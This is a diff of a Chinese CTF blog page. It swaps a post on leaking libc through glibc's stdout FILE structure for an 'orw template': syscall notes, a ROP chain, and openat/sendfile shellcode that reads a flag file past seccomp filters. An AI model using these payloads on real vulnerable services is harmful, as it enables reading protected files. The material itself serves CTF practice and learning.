@@ -20,24 +20,22 @@
     var CONFIG = {"hostname":"masco-joy.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="_IO_2_1_stdout_的利用（速成）详情可看：hollk  国资 _IO_FILE_plus结构体struct _IO_FILE_plus &#123;     FILE file;     const struct _IO_jump_t *vtable; &#125;  其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8   _IO_2_1_stdout">
+  <meta name="description" content="orw 模板tipsliunx64：1、read 0、readv 192、write 1、writev 203、open 2、openat 2574、sendfile 40        orw的原型及参数1. read 原型: ssize_t read(int fd, void *buf, size_t count); 参数: fd：文件描述符。 buf：指向存储读取数据的缓冲区的指针。 cou">
 <meta property="og:type" content="article">
-<meta property="og:title" content="_IO_2_1_stdout_">
-<meta property="og:url" content="https://masco-joy.github.io/2024/07/19/IO_2_1_stdout/index.html">
+<meta property="og:title" content="orw模板">
+<meta property="og:url" content="https://masco-joy.github.io/2024/08/10/orw%E6%A8%A1%E6%9D%BF/index.html">
 <meta property="og:site_name" content="Masco&#39;s blog">
-<meta property="og:description" content="_IO_2_1_stdout_的利用（速成）详情可看：hollk  国资 _IO_FILE_plus结构体struct _IO_FILE_plus &#123;     FILE file;     const struct _IO_jump_t *vtable; &#125;  其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8   _IO_2_1_stdout">
+<meta property="og:description" content="orw 模板tipsliunx64：1、read 0、readv 192、write 1、writev 203、open 2、openat 2574、sendfile 40        orw的原型及参数1. read 原型: ssize_t read(int fd, void *buf, size_t count); 参数: fd：文件描述符。 buf：指向存储读取数据的缓冲区的指针。 cou">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://masco-joy.github.io/images/stdout.png">
-<meta property="article:published_time" content="2024-07-19T13:05:10.000Z">
-<meta property="article:modified_time" content="2024-08-04T03:46:05.722Z">
+<meta property="article:published_time" content="2024-08-10T03:32:08.000Z">
+<meta property="article:modified_time" content="2024-08-10T03:55:17.680Z">
 <meta property="article:author" content="Masco">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="IO">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="orw">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://masco-joy.github.io/images/stdout.png">
 
-<link rel="canonical" href="https://masco-joy.github.io/2024/07/19/IO_2_1_stdout/">
+<link rel="canonical" href="https://masco-joy.github.io/2024/08/10/orw%E6%A8%A1%E6%9D%BF/">
 
 
 <script id="page-configurations">
@@ -50,7 +48,7 @@
   };
 </script>
 
-  <title>_IO_2_1_stdout_ | Masco's blog</title>
+  <title>orw模板 | Masco's blog</title>
   
 
 
@@ -184,7 +182,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://masco-joy.github.io/2024/07/19/IO_2_1_stdout/">
+    <link itemprop="mainEntityOfPage" href="https://masco-joy.github.io/2024/08/10/orw%E6%A8%A1%E6%9D%BF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/images/background4.jpg">
@@ -197,7 +195,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          _IO_2_1_stdout_
+          orw模板
         </h1>
 
         <div class="post-meta">
@@ -206,16 +204,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2024-07-19 21:05:10" itemprop="dateCreated datePublished" datetime="2024-07-19T21:05:10+08:00">2024-07-19</time>
+              <time title="Created: 2024-08-10 11:32:08 / Modified: 11:55:17" itemprop="dateCreated datePublished" datetime="2024-08-10T11:32:08+08:00">2024-08-10</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-08-04 11:46:05" itemprop="dateModified" datetime="2024-08-04T11:46:05+08:00">2024-08-04</time>
-              </span>
 
           <br>
             <span class="post-meta-item" title="Symbols count in article">
@@ -223,14 +215,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>366</span>
+              <span>1.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
+              <span>3 mins.</span>
             </span>
 
         </div>
@@ -242,27 +234,96 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <hr>
-<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
-<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
-<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
-    FILE file;
-    const struct _IO_jump_t *vtable;
-&#125;
-</code></pre>
-<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+        <h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
 <br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
 
-<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
-<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
-<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
 
-2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
 
-3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
 </code></pre>
-<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
-<hr>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。</p>
 
     </div>
 
@@ -301,7 +362,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="https://masco-joy.github.io/2024/07/19/IO_2_1_stdout/" title="_IO_2_1_stdout_">https://masco-joy.github.io/2024/07/19/IO_2_1_stdout/</a>
+    <a href="https://masco-joy.github.io/2024/08/10/orw%E6%A8%A1%E6%9D%BF/" title="orw模板">https://masco-joy.github.io/2024/08/10/orw模板/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -313,8 +374,8 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/pwn/" rel="tag"># pwn</a>
-              <a href="/tags/IO/" rel="tag"># IO</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/orw/" rel="tag"># orw</a>
           </div>
 
         
@@ -328,13 +389,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/07/18/bin/" rel="prev" title="bin">
-      <i class="fa fa-chevron-left"></i> bin
+    <a href="/2024/07/25/house%20of/" rel="prev" title="house of模板">
+      <i class="fa fa-chevron-left"></i> house of模板
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2024/07/20/Fmt/" rel="next" title="format利用">
-      format利用 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -393,7 +451,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IO-2-1-stdout-%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%88%E9%80%9F%E6%88%90%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">_IO_2_1_stdout_的利用（速成）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">1.0.1.</span> <span class="nav-text">_IO_FILE_plus结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-2-1-stdout-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">1.0.2.</span> <span class="nav-text">_IO_2_1_stdout_结构体</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#orw-%E6%A8%A1%E6%9D%BF"><span class="nav-number">1.</span> <span class="nav-text">orw 模板</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tips"><span class="nav-number">1.0.1.</span> <span class="nav-text">tips</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw%E7%9A%84%E5%8E%9F%E5%9E%8B%E5%8F%8A%E5%8F%82%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">orw的原型及参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E7%89%88"><span class="nav-number">1.1.1.</span> <span class="nav-text">模版</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
